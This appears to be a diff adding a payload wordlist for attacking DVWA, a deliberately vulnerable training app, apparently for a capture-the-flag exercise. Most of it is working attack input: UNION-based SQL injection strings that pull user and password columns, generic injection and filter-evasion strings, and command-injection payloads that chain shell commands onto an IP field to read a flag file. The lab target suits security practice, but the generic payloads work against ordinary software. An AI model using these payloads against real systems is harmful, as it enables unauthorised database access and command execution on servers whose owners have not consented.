@@ -1,0 +1,134 @@
+# ── SQL INJECTION — UNION SELECT (DVWA id parameter) ──────────────────────────
+# Primary targets: users table, avatar/password columns
+1' UNION SELECT user,avatar FROM users-- -
+1' UNION ALL SELECT user,avatar FROM users-- -
+1' UNION SELECT user,avatar FROM users LIMIT 0,10-- -
+1' UNION SELECT user,avatar FROM users WHERE user='flaguser'-- -
+1' uNiOn SeLeCt user,avatar fRoM users-- -
+1' UNION SELECT user,avatar FROM users#
+1' UNION ALL SELECT user,avatar FROM users#
+1' UNION SELECT avatar,user FROM users-- -
+1' UNION SELECT password,avatar FROM users-- -
+1' UNION SELECT first_name,avatar FROM users-- -
+1' or 1=1 UNION SELECT user,avatar FROM users-- -
+1' UNION SELECT 1,avatar FROM users WHERE user LIKE '%flag%'-- -
+1' UNION SELECT 1,avatar FROM users WHERE avatar LIKE '%FLAG%'-- -
+
+# Broader fallbacks — enumerate schema
+1' UNION SELECT 1,2-- -
+1' UNION SELECT table_name,2 FROM information_schema.tables-- -
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+1' OR '1'='1
+1' OR 1=1-- -
+1 OR 1=1
+
+# ── SQL INJECTION — PayloadsAllTheThings / SecLists generics ──────────────────
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\\
+;
+' or "
+-- or #
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+/*…*/
++		 -- (tab injection)
+|
+||
+%7C
+&&
+OR 1=1
+OR 1=0
+OR x=x
+OR x=y
+OR 1=1#
+OR 1=0#
+OR x=x#
+OR x=y#
+OR 1=1--
+OR 1=0--
+OR x=x--
+OR x=y--
+OR 3409=3409 AND ('pytW' LIKE 'pytW
+OR 3409=3410 AND ('pytW' LIKE 'pytW
+HAVING 1=1--
+HAVING 1=0--
+AND 1=1--
+AND 1=0--
+AND 1=1
+AND 1=0
+AND 1=1#
+AND 1=0#
+AND 1=1--
+AND 1=0--
+UNION ALL SELECT NULL--
+UNION ALL SELECT NULL,NULL--
+UNION ALL SELECT NULL,NULL,NULL--
+1' UNION SELECT username, password FROM users --
+1' union select 0x2720756e696f6e2073656c65637420312c3223#
+' AND SLEEP(0)--
+' AND '1'='1
+1 AND 1=1 --
+1 AND 1=2 --
+admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
+
+# ── SQL INJECTION — Evasion / encoding ───────────────────────────────────────
+?id=1%09and%091=1%09--
+?id=1%0Aand%0A1=1%0A--
+?id=1%0Band%0B1=1%0B--
+?id=1%0Cand%0C1=1%0C--
+?id=1%0Dand%0D1=1%0D--
+?id=1%A0and%A01=1%A0--
+?id=1/*comment*/AND/**/1=1/**/--
+?id=1/*!12345UNION*//*!12345SELECT*/1--
+?id=(1)and(1)=(1)--
+1' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A --
+1' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A --
+ffifdyop
+1 AND IF(1=1, SLEEP(0), 0) --
+
+# ── CMD INJECTION — reading flag2.txt with various techniques ─────────────────
+127.0.0.1; cat /var/www/html/hackable/flags/flag2.txt
+127.0.0.1 | cat /var/www/html/hackable/flags/flag2.txt
+127.0.0.1 && cat /var/www/html/hackable/flags/flag2.txt
+127.0.0.1\ncat /var/www/html/hackable/flags/flag2.txt
+127.0.0.1;${IFS}cat${IFS}/var/www/html/hackable/flags/flag2.txt
+127.0.0.1; head -1 /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; tac /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; /bin/cat /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; cat /var/www/html/hackable/flags/flag?.txt
+127.0.0.1; cat${IFS}/var/www/html/hackable/flags/flag2.txt
+127.0.0.1 $(cat /var/www/html/hackable/flags/flag2.txt)
+127.0.0.1; awk '{print}' /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; while read l; do echo $l; done < /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; python3 -c "print(open('/var/www/html/hackable/flags/flag2.txt').read())"
+127.0.0.1; perl -ne 'print' /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; dd if=/var/www/html/hackable/flags/flag2.txt 2>/dev/null
+127.0.0.1; strings /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; {cat,/var/www/html/hackable/flags/flag2.txt}
+127.0.0.1; F=/var/www/html/hackable/flags/flag2.txt; cat $F
+127.0.0.1; base64 /var/www/html/hackable/flags/flag2.txt | base64 -d
+127.0.0.1; xxd /var/www/html/hackable/flags/flag2.txt | awk '{print $2}'
+127.0.0.1; less /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; more /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; nl /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; sort /var/www/html/hackable/flags/flag2.txt
+127.0.0.1; rev /var/www/html/hackable/flags/flag2.txt | rev
